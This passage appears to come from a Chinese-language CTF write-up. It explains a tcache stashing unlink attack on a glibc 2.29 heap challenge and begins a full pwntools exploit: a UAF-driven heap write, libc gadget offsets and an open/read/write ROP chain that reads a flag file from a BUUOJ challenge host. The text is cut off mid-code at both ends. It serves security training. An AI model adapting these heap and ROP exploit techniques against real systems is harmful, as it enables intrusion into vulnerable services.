punctuation\">(</span>tc_victim <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        bck <span class=\"token operator\">=</span> tc_victim<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">set_inuse_bit_at_offset</span> <span class=\"token punctuation\">(</span>tc_victim<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>av <span class=\"token operator\">!=</span> <span class=\"token operator\">&amp;</span>main_arena<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>          <span class=\"token function\">set_non_main_arena</span> <span class=\"token punctuation\">(</span>tc_victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        bin<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> bin<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token function\">tcache_put</span> <span class=\"token punctuation\">(</span>tc_victim<span class=\"token punctuation\">,</span> tc_idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>也就是说： <code>当smallbin中存在块，但是tcache未满时，如果从smallbin在取出一个块后未空，那么就会把这个对应大小的smallbin中的所有chunk全部转移到相应大小的tcache中，直到tcache满为止。</code></p>\n<ul>\n<li>\n<p>当 tcache_bin 内有 6 个 chunk 时，无法去完成一个任意地址分配的操作，但是可以把链头 chunk 的 BK 位置写上一个 main_arena</p>\n</li>\n<li>\n<p>若有 5 个块时，则可以去完成一个任意地址分配的操作</p>\n</li>\n</ul>\n<p>此题可以用 6 个 chunk 的场景</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tAdd<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'oooo'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tDel<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>先去申请 6 个 0xf0 的 chunk，并放入 0x100 的 tcache_bin 内</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'bbbb'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 防止合併</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span>\t\t\t <span class=\"token comment\"># 置入 unsortedbin</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'cccc'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 切割 </span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 置入 0x100 的 small bin</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'bbbb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'cccc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'cccc'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 置入 0x100 的 small bin</span></pre></td></tr></table></figure><p>在 0x100 的 small_bin 放入两个 chunk</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x300</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>heapaddr <span class=\"token operator\">-</span> <span class=\"token number\">0xb000</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xe7e0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>heapaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x250</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x800</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'oooo'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>uaf 写链头 chunk，完成 <code>tcache-stashing-unlink-attack</code> ，从而在目标地址写上 main_arean (…) 地址</p>\n<p>接下来 orw 写到一个 chunk 上，并用栈溢出迁移过去即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>lvr <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000058373</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>rdi <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000026542</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>rsi <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000026f9e</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>rdx <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000012bda6</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>open_addr <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>read_addr <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>writ_addr <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>flag_addr <span class=\"token operator\">=</span> heapaddr <span class=\"token operator\">-</span> <span class=\"token number\">0xb000</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xf630</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>pay <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">b'./flag\\x00\\x00'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> open_addr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token operator\">+</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rdx<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> read_addr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token operator\">+</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rdx<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> writ_addr</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>pay<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>pay2 <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lvr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>meau<span class=\"token punctuation\">(</span><span class=\"token number\">666</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'What do you want to say?'</span><span class=\"token punctuation\">,</span>pay2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp：</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc-2.29.so'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"node5.buuoj.cn:26125\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">meau</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your input: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>cz<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input the red packet idx: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>cz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input content: '</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Del</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input the red packet idx: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Edi</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input the red packet idx: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input content: '</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Sho</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input the red packet idx: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tAdd<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\tDel<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>Sho<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>heapaddr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xd6c0</span> <span class=\"token operator\">+</span> <span class=\"token 